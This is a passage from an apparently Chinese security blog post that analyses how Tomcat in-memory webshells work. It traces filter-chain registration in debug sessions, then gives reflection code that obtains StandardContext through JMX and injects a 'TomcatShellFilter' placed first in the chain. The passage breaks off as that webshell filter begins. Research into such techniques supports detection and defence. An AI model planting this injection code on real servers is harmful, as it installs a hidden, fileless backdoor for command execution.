class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            打断点调试，可以看到执行HelloWorld之前，首先经过了FirstFilter拦截器的处理，并在执行完HelloWorld的doGet方法后执行后，回到了FirstFilter中的doFilter方法对response追加testing666。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114624897.png" alt="image-20201225114624897"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114725785.png" alt="image-20201225114725785"></p>
<p>​        执行结果如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114506040.png" alt="image-20201225114506040"></p>
<p>​    我们再尝试创建一个过滤器链，再添加一个过滤器，再web.xml中进行配置，配置如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;secondFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">secondFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">param</span>-<span class="title">name</span>&gt;<span class="title">encoding</span>&lt;/<span class="title">param</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">param</span>-<span class="title">value</span>&gt;<span class="title">GB2312</span>&lt;/<span class="title">param</span>-<span class="title">value</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">secondFilter</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/<span class="title">HelloWorld</span>&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        secondFilter内容如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">secondFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        chain.doFilter(req, resp);</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"&lt;h1&gt;secondFilter Test&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        debug调试，可以看到进入Helloworld的doGet方法之前先经过了FirstFilter.doFilter再经过了secondFilter.doFilter。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225121140703.png" alt="image-20201225121140703"></p>
<p>​            由于先经过了FirstFilter再经过了secondFilter,因此再返回的时候，先会经过secondFilter的处理，再经过FirstFilter处理，最终执行结果如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225121243273.png" alt="image-20201225121243273"></p>
<p><strong>注解实现过滤器</strong></p>
<p>​        在web.xml中对servlet和过滤器的配置同样可以使用注解实现，对servlet的配置如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134433759.png" alt="image-20201225134433759"></p>
<p>​        使用@WebFilter注解对两个过滤器进行配置。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134519636.png" alt="image-20201225134519636"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134526683.png" alt="image-20201225134526683"></p>
<p>​        修改后运行tomcat，发现还是先执行了firstFilter再执行了secondFilter，我们知道在上一个例子中执行过滤器链是因为我们在web.xml中进行配置，这个执行顺序是和<code>&lt;filter-mapping&gt;</code> 的声明顺序有关的，但是在这个例子中并没有在web.xml中进行配置。经过查阅资料，在注解中进行配置和filterName首字母有关，A-Z代表着不同的执行顺序。</p>
<h3 id="如何动态注册Filter"><a href="#如何动态注册Filter" class="headerlink" title="如何动态注册Filter?"></a>如何动态注册Filter?</h3><h4 id="Tomcat中Filter注册流程"><a href="#Tomcat中Filter注册流程" class="headerlink" title="Tomcat中Filter注册流程"></a>Tomcat中Filter注册流程</h4><p>​        在了解如何动态注册Filter之前，我们先看下tomcat是如何注册Filter的，在org.apache.catalina.core.StandardWrapperValve#invoke方法中，会调用createFilterChain方法。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225144929433.png" alt="image-20201225144929433"></p>
<p>​        在org.apache.catalina.core.ApplicationFilterChain#createFilterChain中，会获取当前request对象中是否设置了filterChain，没有设置会创建一个ApplicationFilterChain对象并设置到request对象中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145256764.png" alt="image-20201225145256764"></p>
<p>​        继续向下执行，调用org.apache.catalina.core.StandardContext#findFilterMaps,会返回过滤器数组，这个数组中包含两个我们实现的过滤器和一个tomcat自带的过滤器。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145324041.png" alt="image-20201225145324041"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145355643.png" alt="image-20201225145355643"></p>
<p>​            判断获取的filterMaps中的过滤器是否满足dispatcher和requestpath的条件，均满足后会添加到filterChain中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145548170.png" alt="image-20201225145548170"></p>
<p>​        获取到满足条件的filter后，会将满足条件的filterChain返回。继续看org.apache.catalina.core.StandardWrapperValve#invoke方法，会执行filterChains的doFilter方法。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145909761.png" alt="image-20201225145909761"></p>
<p>​        在org.apache.catalina.core.ApplicationFilterChain#doFilter中会调用internalDoFilter，跟进这个方法，首先获取第一个filter，并执行对应的doFilter方法。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150035887.png" alt="image-20201225150035887"></p>
<p>​        跟进FirstFilter#doFilter，首先调用ApplicationFilterChain.doFilter(req, resp)</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150119180.png" alt="image-20201225150119180"></p>
<p>​        ApplicationFilterChain.doFilter中同样会调用internalDoFilter</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150321470.png" alt="image-20201225150321470"></p>
<p>​            继续调用其他过滤器，这个过滤器是tomcat自带的过滤器。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150403698.png" alt="image-20201225150403698"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150516874.png" alt="image-20201225150516874"></p>
<p>​        继续执行org.apache.catalina.core.ApplicationFilterChain#internalDoFilter，此时if条件已经不能满足，代表过滤器链已经执行结束了。跳过了if步骤后最终会执行servlet.service方法。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150630961.png" alt="image-20201225150630961"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150731473.png" alt="image-20201225150731473"></p>
<p>​        分析完这个调用，我们可以分析出这个调用的关键点在于org.apache.catalina.core.StandardContext#findFilterMaps中的filterMaps</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151110960.png" alt="image-20201225151110960"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151057672.png" alt="image-20201225151057672"></p>
<p>​        我们看一下这个filterMaps[]是在何时被赋值的。在org.apache.catalina.core.StandardContext#addFilterMap中打断点，发现当我们启动项目的时候会被加载。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151431915.png" alt="image-20201225151431915"></p>
<p>​        查看上层调用，FilterMap来自于<code>webxml.getFilterMappings()</code></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142018334.png" alt="image-20201228142018334"></p>
<p>​        getFilterMappings在webxml.java中，返回filterMaps对象，所以我们得知道filterMaps是在哪里被赋值的。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142105141.png" alt="image-20201228142105141"></p>
<p>​        经过分析存在addFilterMapping方法，该方法中会为FilterMaps添加内容</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142153204.png" alt="image-20201228142153204"></p>
<p>​        在addFilterMapping方法打断点，重新启动项目，发现在processAnnotationWebFilter中调用了addFilterMapping添加filterMap，但是在调用addFilterMapping添加filterMap前也会调用addFilter添加filterDef对象。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228143903686.png" alt="image-20201228143903686"></p>
<p>​         查看filterDef和filterMap的内容，filterDef中包含了filterClass内容，而filterMap中包含了urlPatterns等内容，也就是说filterMap是负责url匹配的，其作用是解析web.xml中的<filerMap>标签。而FilterDef中包含Filter的定义和处理这个Filter的类。</filerMap></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228144126525.png" alt="image-20201228144126525"></p>
<p>​        查看webxml.java中的代码，可以看到filterDef的值会被保存到filters中。filterMap的内容会被保存到filterMaps中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228150628029.png" alt="image-20201228150628029"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228150721604.png" alt="image-20201228150721604"></p>
<p>​        从这里可以看出，如果想要动态创建filter过滤器，只要在filterMaps和filters中添加值就可以了，但是我们在跟踪tomcat filter过滤链加载的过程中，并没有注意到filters是在哪里起作用的，重新查看filter调用过程，发现filter的类是通过filterConfig.getFilter()获取的。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228151816221.png" alt="image-20201228151816221"></p>
<p>​        在filterConfig接口实现类ApplicationFilterConfig中的getFilter方法中，可以看到能否获取到Filter是和filterDef有关系的。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228152128438.png" alt="image-20201228152128438"></p>
<p>​        也就是说理论上来讲我们可以通过获取webxml对象，并修改其中的filters和filterMaps的内容来动态添加filter过滤器的，但是这个webxml对象我们在运行中无法获取到。但是在通过webxml.getFilters()或者webxml.getFilterMappings（）方法获取到FilterDef和filterMap后，会调用StandardContext中的addFilterDef和addFilterMap方法将filter和filterMap赋值给standardContext对象的变量中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153406512.png" alt="image-20201228153406512"></p>
<p>​        并且在最终创建过滤链的时候会调用standardContext的findFilterMaps方法来获取filterMaps。所以我们可以通过获取StandardContext对象，并调用其中的addFilterMap和addFilterDef来动态添加filter。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153855563.png" alt="image-20201228153855563"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153949211.png" alt="image-20201228153949211"></p>
<h4 id="StandardContext注册Filter"><a href="#StandardContext注册Filter" class="headerlink" title="StandardContext注册Filter"></a><strong>StandardContext注册Filter</strong></h4><p>​        JMX(Java Management Extensions)是一套标准，这种机制可以方便的管理、监控正在运行中的Java程序。常用于管理线程，内存，日志Level，服务重启，系统环境等。</p>
<ul>
<li>MBean：是Managed Bean的简称，可以翻译为“管理构件”。在JMX中MBean代表一个被管理的资源实例，通过MBean中暴露的方法和属性，外界可以获取被管理的资源的状态和操纵MBean的行为。</li>
<li>MBeanServer：MBean生存在一个MBeanServer中。MBeanServer管理这些MBean，并且代理外界对它们的访问。并且MBeanServer提供了一种注册机制，是的外界可以通过名字来得到相应的MBean实例。</li>
</ul>
<p><strong>配置Jconsole监控MBean</strong></p>
<p>​        在启动项目时，添加如下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.hostname&#x3D;127.0.0.1 -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port&#x3D;11911 -Dcom.sun.management.jmxremote.ssl&#x3D;false -Dcom.sun.management.jmxremote.authenticate&#x3D;false</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113628383.png" alt="image-20201228113628383"></p>
<p>​            启动Jconsole，<code>连接-》新建连接-》Bootstrap进程</code></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113730266.png" alt="image-20201228113730266"></p>
<p>​        查看MBean中的内容，在BasicAuthenticator中可以看到其中存在context对象，因此我们可以通过<code>type=Valve,host=localhost,context=/manager,name=BasicAuthenticator</code>来获取Context对象</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113838455.png" alt="image-20201228113838455"></p>
<p>​        首先获取MBeanServer，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br></pre></td></tr></table></figure>

<p>​        获取mBeanServer后可以通过<code>mBeanServer-》mbsInterceptor属性-》repository属性-》domainTb属性</code>获取所有的MBean对象。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228114652723.png" alt="image-20201228114652723"></p>
<p>​        通过反射调用获取到domainTb。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object mbsInterceptor = field.get(mBeanServer);</span><br><span class="line"><span class="comment">// 获取repository</span></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object repository = field.get(mbsInterceptor);</span><br><span class="line"><span class="comment">// 获取domainTb</span></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap&lt;String, Map&lt;String, NamedObject&gt;&gt; domainTb = (HashMap&lt;String,Map&lt;String,NamedObject&gt;&gt;)field.get(repository);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228115336921.png" alt="image-20201228115336921"></p>
<p>​        下一步我们找到<code>Catalina-&gt;context=/manager,host=localhost,name=BasicAuthenticator,type=Valve</code> </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NamedObject nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/manager,host=localhost,name=BasicAuthenticator,type=Valve"</span>);</span><br><span class="line">field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object object = field.get(nonLoginAuthenticator);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228115634740.png" alt="image-20201228115634740"></p>
<p>​        从resource中获取Context对象。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228120511795.png" alt="image-20201228120511795"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取resource</span></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object resource = field.get(object);</span><br><span class="line"><span class="comment">// 获取context</span></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.catalina.authenticator.AuthenticatorBase"</span>).getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            StandardContext standardContext = (StandardContext) field.get(resource);</span><br></pre></td></tr></table></figure>

<p>​        当然不止<code>context=/manager,host=localhost,name=BasicAuthenticator,type=Valve</code>可以获得context对象。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228120830868.png" alt="image-20201228120830868"></p>
<pre><code>得到StandardContext对象后，调用addFilterDef和addFilterMap添加filterDef和FilterMap。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">FilterDef filterDef = context.findFilterDef(filterName);  <span class="comment">//查看当前的filter中是否包含我们自定义的filter。</span></span><br><span class="line">Filter filter = <span class="keyword">new</span> TomcatShellFilter(); <span class="comment">//创建我们要注入的filter对象</span></span><br><span class="line"><span class="comment">// filterDef</span></span><br><span class="line"><span class="keyword">if</span> (filterDef == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// Gen filterDef</span></span><br><span class="line">    filterDef = <span class="keyword">new</span> FilterDef(); <span class="comment">//新建FilterDef对象</span></span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    <span class="comment">// Add filterDef</span></span><br><span class="line">    context.addFilterDef(filterDef); <span class="comment">//将filterDef添加到context中。</span></span><br><span class="line">    <span class="comment">// Refresh filterConfigs</span></span><br><span class="line">    context.filterStart();</span><br><span class="line">    <span class="comment">// filterMap</span></span><br><span class="line">    filterMap.setFilterName(filterName);</span><br><span class="line">    filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));</span><br><span class="line">    filterMap.addURLPattern(filterUrlPattern);</span><br><span class="line">    context.addFilterMap(filterMap);  <span class="comment">//添加filterMap</span></span><br><span class="line">    <span class="comment">// Order</span></span><br><span class="line">    Object[] filterMaps = context.findFilterMaps();</span><br><span class="line">    Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length]; <span class="comment">//对filterMaps中的内容重新排序，让目标首先经过我们自定义的过滤器。</span></span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        FilterMap f = (FilterMap) filterMaps[i];</span><br><span class="line">        <span class="keyword">if</span> (f.getFilterName().equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">            tmpFilterMaps[<span class="number">0</span>] = f;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmpFilterMaps[index++] = f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">        filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"Test Add Filter................"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"add success"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        TomcatShellFilter的内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * webshell命令参数名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span 